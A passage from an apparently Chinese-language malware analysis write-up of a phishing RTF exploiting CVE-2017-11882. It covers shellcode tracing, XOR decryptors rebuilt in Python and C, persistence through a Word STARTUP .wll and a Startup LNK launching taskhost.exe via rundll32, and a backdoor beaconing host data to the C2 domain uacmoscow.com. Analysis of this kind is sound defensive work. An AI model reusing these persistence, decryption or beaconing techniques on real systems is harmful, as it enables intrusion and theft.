<img src=https://hackmd.io/_uploads/rJzpc-ITp.png alt=圖片>
發現他會return到<code>026A878F</code>這個地方(每一次執行會不一樣，有點類似ASLR，不過通常會把要執行的shellcode放在<code>26AXXXX</code>開頭的地方)，這個位置存的應該就是他的shellcode
<img src=https://hackmd.io/_uploads/r1v_iWLpT.png alt=圖片></p></li><li><p>詳細的分析怎麼做到這一步shellcode的
首先，我已經知道他是怎麼利用stack overflow的方式放上shellcode，但是我找了超久都還是沒有找到2016版本的漏洞在哪裡，應該說根據<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>的說明，我知道因為在複製字體名稱的時候，沒有檢查字的長度，所以可以利用這一點蓋到return address，也就是說，可以讓程式跳到我們預先設定好的shellcode上面，那為什麼找不到他檢查長度的地方呢?因為我的做法是利用stack上的backtrace去看call完CreateFile之後要回到哪裡去判斷他是什麼時候篡改了return address，但跟完動態發現他似乎很早就已經把shellcode放上去了(只是什麼時候不太清楚)，所以礙於時間的關係，我先往下分析，詳細的流程如下:
<img src=https://hackmd.io/_uploads/H1r90hLap.png alt=圖片>
到最後他會到<code>0x430BFB</code>這個位置然後跳到<code>0x268A48C</code>，請注意看一下底下一點的code當中有一個<code>jmp 0x268A4BE</code>，這個一跳過去就會使dbg重新編譯過，這也是shellcode很常使用到的技巧
<img src=https://hackmd.io/_uploads/BJaheaI6T.png alt=圖片>
<img src=https://hackmd.io/_uploads/Sy7BbpLa6.png alt=圖片>
若順著這一條往下執行，他ret的地方就會變成，==0x26A6E8A==(當然每一次都不一樣，因為是動態的)
<img src=https://hackmd.io/_uploads/HJZhZpUap.png alt=圖片></p><hr><ul><li><p>從這一段開始就是有關於呼叫windows API的部分，而且可以看到，剛跳過去的時候也是一樣call了==0x26A6E8E==，讓真正的shellcode藏在其中
<img src=https://hackmd.io/_uploads/SkDJf6Lpp.png alt=圖片></p></li><li><p>Decrypt
這一段應該就是在decrypt後續的shellcode，可以看到他不斷loop做一件事情，那就是XOR目前取得的word bytes(0xC390)，總共應該做了0x8BA次，每次改2 Bytes
<img src=https://hackmd.io/_uploads/S1gLGp8ap.png alt=圖片>
可以看到decrypt後就真的能辨識一些字元
<img src=https://hackmd.io/_uploads/rJtgETLpT.png alt=圖片>
decrypt完的code截圖如下，這才是真正的shellcode
<img src=https://hackmd.io/_uploads/BJb9w6Lpp.png alt=圖片></p></li><li><p>做的事情如下</p><ol><li><p>解析出<code>ntdll.dll</code>和<code>kernelbase.dll</code>
這一段很有趣，他應該就是我在<a href=https://hackmd.io/@SBK6401/Bkd51XRM6>2023 Lab - WinMalware - Dynamic API Resolution Background</a>中學到的API Resolution技巧</p><blockquote><p>不靠 loader，在 runtime 自行爬取系統結構，取得所需的 Windows API</p></blockquote><p><img src=https://hackmd.io/_uploads/HygbsTU6T.png alt=圖片>
第一個使用的dll是<code>msvcrt.dll</code>，以此類推，我們可以把下一個function當作是在爬<code>kernel32.dll</code>
<img src=https://hackmd.io/_uploads/Syb5TpITT.png alt=圖片></p></li><li><p>Fetch API
這個是我看到熟悉的老朋友→Magic Header(MZ和PE字樣)，其實這一段就是在fetch各個dll file的API(只要給定dll的file當作參數給這個function，就可以爬到想要的API)，我自己看到的總共有以下個:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GetProcAddresss-&gt;kernel32.dll
</span></span><span style=display:flex><span>VirtualProtext-&gt;kernel32.dll
</span></span><span style=display:flex><span>clearerr-&gt;ucrtbase.dll
</span></span><span style=display:flex><span>CreateFileA-&gt;kernel32.dll
</span></span><span style=display:flex><span>GetFileSize-&gt;kernel32.dll
</span></span><span style=display:flex><span>ReadFile-&gt;kernel32.dll
</span></span><span style=display:flex><span>WriteFile-&gt;kernel32.dll
</span></span><span style=display:flex><span>CloseHandle-&gt;kernel32.dll
</span></span><span style=display:flex><span>CreateProcessA-&gt;kernel32.dll
</span></span><span style=display:flex><span>GetModuleFileNameA-&gt;kernel32.dll
</span></span><span style=display:flex><span>ResumeThread-&gt;kernel32.dll
</span></span><span style=display:flex><span>TerminateProcess-&gt;kernel32.dll
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>GetThreadContext-&gt;kernel32.dll
</span></span><span style=display:flex><span>ReadProcessMemory-&gt;kernel32.dll
</span></span><span style=display:flex><span>GetModuleHandleA-&gt;kernel32.dll
</span></span><span style=display:flex><span>WriteProcessMemory-&gt;kernel32.dll
</span></span><span style=display:flex><span>SetThreadContext-&gt;kernel32.dll
</span></span><span style=display:flex><span>ZwUnmapViewOfSection-&gt;ntdll.dll
</span></span></code></pre></div><p><img src=https://hackmd.io/_uploads/S108gJvTa.png alt=圖片></p></li><li><p>CreateFile & VitualAlloc & Decrypt
Fetch完API後，他就Create <code>C:\Users\REM\AppData\Local\Temp\8.t</code>
<img src=https://hackmd.io/_uploads/HkCUTDda6.png alt=圖片>
並且取得他的大小後開一個同樣大小的空間給current process，接著他用ReadFile把讀取倒的所有內容放到該空間中
<img src=https://hackmd.io/_uploads/ryuB0vdTa.png alt=圖片>
取完資料後如下
<img src=https://hackmd.io/_uploads/Sk6wRvu6T.png alt=圖片>
ReadFile完後就開始解密原本的內容，詳細的解密過程如下(一整大段都是):
<img src=https://hackmd.io/_uploads/rJj2d_Op6.png alt=圖片>
:::spoiler Psudo Code</p><pre tabindex=0><code class=language-python! data-lang=python!>from Crypto.Util.number import long_to_bytes
data = open(&#39;./5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t&#39;, &#39;rb&#39;).read()
key = 0x48B53A6C
idx = 0
file_size = len(data)
decrypt_data = b&#34;&#34;
if file_size &gt; 0:
    while idx &lt; file_size:
        ebx = 7
        while ebx &gt; 0:
            ecx = key &gt;&gt; 26
            ecx ^= key
            ecx &gt;&gt;= 3
            ecx ^= key
            key *= 2
            if key &gt; 0x100000000:
                key -= 0x100000000
            ecx &amp;= 1
            key |= ecx
            key += 1
            ebx -= 1
        decrypt_data += long_to_bytes(data[idx] ^ (key &amp; 0xFF))

        idx += 1
open(&#39;./8.t_decrypt&#39;, &#39;wb&#39;).write(decrypt_data)
</code></pre><p>:::</p></li><li><p>CreateFile & WriteFile
接著他創了<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>這個file必且寫上一些東西，其實就是我們剛剛decrypt的檔案</p></li></ol></li></ul></li><li><p>Analyze intel.wll
首先他先Decrypt儲存在內部的執行檔(有加密過的)，然後把他寫到</p><pre tabindex=0><code>C:\Users\REM\AppData\Local\Temp\taskhost.exe
</code></pre><p>這個檔案中，解密就是一個了無新意的XOR，解密的code如下:
:::spoiler</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>CreateTask</span>(LPCSTR lpFileName)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  LPCVOID <span style=color:#f92672>*</span>lpBuffer; <span style=color:#75715e>// edi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE FileA; <span style=color:#75715e>// ebp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// esi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> counter; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  _BYTE <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// ecx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD NumberOfBytesWritten; <span style=color:#75715e>// [esp+8h] [ebp-4h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                                                <span style=color:#75715e>// 寫到Task.exe的大小總共是0xB000，每一次寫16bytes(記得要從後面寫回來)，要寫2816次
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  lpBuffer <span style=color:#f92672>=</span> (LPCVOID <span style=color:#f92672>*</span>)operator <span style=color:#a6e22e>new</span>(<span style=color:#ae81ff>16u</span>);
</span></span><span style=display:flex><span>  FileA <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFileA</span>(lpFileName, GENERIC_WRITE, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, CREATE_NEW, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( FileA <span style=color:#f92672>!=</span> (HANDLE)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2816</span>; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>      v5 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>Enc_Task_exe <span style=color:#f92672>+</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>15</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)lpBuffer <span style=color:#f92672>+</span> counter<span style=color:#f92672>++</span>) <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>v5<span style=color:#f92672>--</span> <span style=color:#f92672>^</span> <span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> ( counter <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x10</span> );
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>WriteFile</span>(FileA, lpBuffer, <span style=color:#ae81ff>0x10u</span>, <span style=color:#f92672>&amp;</span>NumberOfBytesWritten, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    operator <span style=color:#a6e22e>delete</span>(lpBuffer);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CloseHandle</span>(FileA);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::
我簡單的寫了一個python script去驗證他，如下:
:::spoiler</p><pre tabindex=0><code class=language-python! data-lang=python!>from Crypto.Util.number import long_to_bytes

BUFFER_SIZE = 16
num_iterations = 2816

lpBuffer = b&#34;&#34;
unk_10005030 = open(&#39;Enc_Task_exe.txt&#39;, &#39;r&#39;).read().split(&#39; &#39;)
FileA = open(&#39;Dec_Task_exe.txt&#39;, &#39;wb&#39;)

# Loop through the iterations
for i in range(num_iterations):
    counter = 15
    while counter &gt;= 0:
        current_byte = unk_10005030[i * BUFFER_SIZE + counter]
        lpBuffer += long_to_bytes(ord(bytes.fromhex(current_byte)) ^ 6)
        counter -= 1

FileA.write(lpBuffer)
</code></pre><p>:::
同時他也create了一個LNK file在</p><pre tabindex=0><code>C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
</code></pre><p>詳細的c code如下
:::spoiler</p><pre tabindex=0><code class=language-clike! data-lang=clike!>void CreateLNK(char *a1, char *a2, char *a3, char *a4, ...)
{
  void *v4; // ecx
  bool v5; // sf
  int v6; // edx
  LPVOID ppv; // [esp+40h] [ebp-4h] BYREF
  void *retaddr; // [esp+44h] [ebp+0h]
  int v9; // [esp+58h] [ebp+14h]
  va_list va; // [esp+5Ch] [ebp+18h] BYREF

  va_start(va, a4);
  v9 = va_arg(va, _DWORD);
  ppv = v4;
  if ( CoInitialize(0) &gt;= 0 )
  {
    if ( CoCreateInstance(&amp;rclsid, 0, 1u, &amp;riid, &amp;ppv) &gt;= 0 )
    {
      (*(*ppv + 80))(ppv, a1, ppv);
      (*(*retaddr + 44))(retaddr, a3);
      (*(*retaddr + 68))(retaddr, v9, 0);
      (*(*retaddr + 60))(retaddr, 7);
      if ( (**retaddr)(retaddr, &amp;unk_10004100, &amp;a2) &gt;= 0 )
      {
        v5 = (*(*a2 + 24))(a2, a4, 0) &lt; 0;
        ppv = a2;
        v6 = *a2;
        if ( !v5 )
        {
          (*(v6 + 8))();
          (*(*ppv + 8))(ppv);
          CoUninitialize();
          return;
        }
        (*(v6 + 8))(ppv);
      }
      (*(*retaddr + 8))(retaddr);
    }
    CoUninitialize();
  }
}
</code></pre><p>:::
雖然看的不是很懂，但總之這個LNK內部儲存的東西如下，簡單來說就是用rundll32.exe跑剛剛解密的taskhost.exe:</p><pre tabindex=0><code>C:\WINDOWS\system32\rundll32.exe url.dll,FileProtocolHandler %TMP%\taskhost.exe
</code></pre><p>只要打開內容看一下就知道了，當然如果可以用工具parse一下會更準確，但礙於時間的關係就先往下分析
<img src=https://hackmd.io/_uploads/HypaHtKa6.png alt=圖片></p></li><li><p>Analyze taskhost.exe
請查閱後門功能這個Section</p></li></ol><h3 id=通訊協定-1>通訊協定
<a class=anchor href=#%e9%80%9a%e8%a8%8a%e5%8d%94%e5%ae%9a-1>#</a></h3><p>因為我沒有實際架一個server讓他連線，所以我是直接錄一個失敗的connection，看他丟了什麼出來
<img src=https://hackmd.io/_uploads/rkwPnVcT6.png alt=圖片>
:::danger
如果之後還有時間可以想辦法架一個C2 Server，實際去構造連線的封包
:::</p><h3 id=加解密演算法-1>加解密演算法
<a class=anchor href=#%e5%8a%a0%e8%a7%a3%e5%af%86%e6%bc%94%e7%ae%97%e6%b3%95-1>#</a></h3><p>如上所述</p><h3 id=後門功能-1>後門功能
<a class=anchor href=#%e5%be%8c%e9%96%80%e5%8a%9f%e8%83%bd-1>#</a></h3><p>先說明一下這個後門在幹麻，順一下流程</p><ol><li>在main function中實作了一個MD5 hash function，並且從0開始算直到符合<code>ef775988943825d2871e1cfa75473ec0</code>，其實這個就是99999999，我不太確定這一段為什麼要做這件事，可能的原因我想有兩個，其一是想要做到PoW的效果，其二是不想要太快執行到關鍵的地方，讓使用者可以放下戒心，但兩個原因都不太能說服自己就是了</li><li>接著他decode出了類似port的1228這個數字和C2 server name:==uacmoscow.com==，我不太確定這個1228是幹嘛的</li><li>接著進入到while loop想辦法fetch到電腦的一些資訊:<ol><li>Local IP</li><li>OEM Code</li><li>Tick Count(從開機時間開始到現在過了多久)</li><li>目前電腦的架構是多少</li><li>OS版本</li><li>Domain Name</li><li>Username</li><li>Computer Name</li><li>Proxy Server有無開啟</li></ol></li><li>先組織好URI→<code>/ru/order/index.php?strPageID=2396956864</code>，以我的VM為例，我的IP是<code>192.168.222.142</code>，換算成hex就是<code>0x8edea8c0</code></li><li>用base32 encode前面得到的所有電腦資訊，以我的VM為例: <code>KNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===</code></li><li>建構封包:<pre tabindex=0><code>Host: uacmoscow.com
Connection: keep-alive
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=AHAKRXUOWUAQAAGUHPKAIAAAAAAAMAAAAABAAAAAAEHQARCFKNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===
</code></pre></li><li>嘗試用Get方式傳送出去，但是因為這個domain掛了，所以有關於連線的地方大部分都是靜態去看</li><li>如果連線成功他就可以執行以下幾件事情:<ol><li>獲取所有目前process的相關資訊後，利用Post傳送出去→<code>/xhome.native.page/datareader.php?sid=2396956864</code></li><li>終止Process</li><li>開Shell</li><li>從Server傳送資料到Local</li></ol></li></ol><h3 id=常駐方式-1>常駐方式
<a class=anchor href=#%e5%b8%b8%e9%a7%90%e6%96%b9%e5%bc%8f-1>#</a></h3><p>目前我看到的部分就只有創了以下兩個檔案，前者是只要victim打開word就會觸發到的機置，後者則是當用戶登錄到 Windows 系統時，系統會自動檢查這個目錄，並運行其中的程序或快捷方式</p><pre tabindex=0><code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll
C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
</code></pre><h2 id=中繼站-1>中繼站
<a class=anchor href=#%e4%b8%ad%e7%b9%bc%e7%ab%99-1>#</a></h2><h3 id=基本資訊-1>基本資訊
<a class=anchor href=#%e5%9f%ba%e6%9c%ac%e8%b3%87%e8%a8%8a-1>#</a></h3><p>IP: <code>58.158.177.102</code>
Domain: <code>uacmoscow.com</code></p><h3 id=關連資訊-1>關連資訊
<a class=anchor href=#%e9%97%9c%e9%80%a3%e8%b3%87%e8%a8%8a-1>#</a></h3><p>該IP可能來源於日本
<img src=https://hackmd.io/_uploads/SyKjnVcTp.png alt=圖片>
:::danger
根據面試官的說明，這個IP已經被資安公司註冊了，變成如果有Victim連線到這個IP，資安公司就會直接通知，以便做後續的IR或是防止更大範圍的受害
:::</p><h2 id=威脅情資-1>威脅情資
<a class=anchor href=#%e5%a8%81%e8%84%85%e6%83%85%e8%b3%87-1>#</a></h2><h3 id=攻擊者-1>攻擊者
<a class=anchor href=#%e6%94%bb%e6%93%8a%e8%80%85-1>#</a></h3><p>不確定</p><h3 id=攻擊時間-1>攻擊時間
<a class=anchor href=#%e6%94%bb%e6%93%8a%e6%99%82%e9%96%93-1>#</a></h3><p>不確定</p><h3 id=受害者-1>受害者
<a class=anchor href=#%e5%8f%97%e5%ae%b3%e8%80%85-1>#</a></h3><p>不確定
:::danger
如果把RTF的內容實際打開去看裡面的內容，會發現是一個會議紀錄，如果再更詳細的OSINT可能可以針對這一點去看有可能的受害者是誰
:::</p><h1 id=reference>Reference
<a class=anchor href=#reference>#</a></h1><p><a href=https://app.any.run/tasks/af6d9ed7-875e-43d9-a2ea-f3edadd32132/#>Any.Run Analyze Phishing Mail</a>
<a href=https://ruhunglee.github.io/malware/ml01/>某個以釣魚郵件發起的 APT 攻擊</a></p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://www.solvusoft.com/en/file-extensions/file-extension-xlam/>什麼是XLAM文件擴展名？</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://jingyan.baidu.com/article/d5c4b52b13c12c9b570dc507.html>Excel如何查看VBA代码？</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href="https://youtu.be/ZOALFkVau8c?si=N_Jp4k1NR15LZGDY">Excel教程小白必学技巧 20：调出开发工具选项卡 </a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href=https://www.jendow.com.tw/wiki/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F>富文本格式</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href=https://www.virustotal.com/gui/file/5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9/community>VirusTotal CVE-2017-11882</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p><a href="https://xz.aliyun.com/t/6668?time__1311=n4%2BxnD0DRDBGitDkDcexlhje0%3D06SOkShx7Ibx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">CVE-2017-11882 Office棧溢出漏洞分析</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p><a href=https://www.freebuf.com/column/183551.html>Office系列漏洞之CVE-2017-11882</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#惡意程式>惡意程式</a><ul><li><a href=#檔案資訊>檔案資訊</a></li><li><a href=#執行流程>執行流程</a></li><li><a href=#通訊協定>通訊協定</a></li><li><a href=#加解密演算法>加解密演算法</a></li><li><a href=#後門功能>後門功能</a></li><li><a href=#常駐方式>常駐方式</a></li></ul></li><li><a href=#中繼站>中繼站</a><ul><li><a href=#基本資訊>基本資訊</a></li><li><a href=#關連資訊>關連資訊</a></li></ul></li><li><a href=#威脅情資>威脅情資</a><ul><li><a href=#攻擊者>攻擊者</a></li><li><a href=#攻擊時間>攻擊時間</a></li><li><a href=#受害者>受害者</a></li></ul></li></ul><ul><li><a href=#惡意程式-1>惡意程式</a><ul><li><a href=#檔案資訊-1>檔案資訊</a></li><li><a href=#執行流程-1>執行流程</a></li><li><a href=#通訊協定-1>通訊協定</a></li><li><a href=#加解密演算法-1>加解密演算法</a></li><li><a href=#後門功能-1>後門功能</a></li><li><a href=#常駐方式-1>常駐方式</a></li></ul></li><li><a href=#中繼站-1>中繼站</a><ul><li><a href=#基本資訊-1>基本資訊</a></li><li><a href=#關連資訊-1>關連資訊</a></li></ul></li><li><a href=#威脅情資-1>威脅情資</a><ul><li><a href=#攻擊者-1>攻擊者</a></li><li><a href=#攻擊時間-1>攻擊時間</a></li><li><a href=#受害者-1>受害者</a></li></ul></li></ul></nav></div></aside></main></body></html>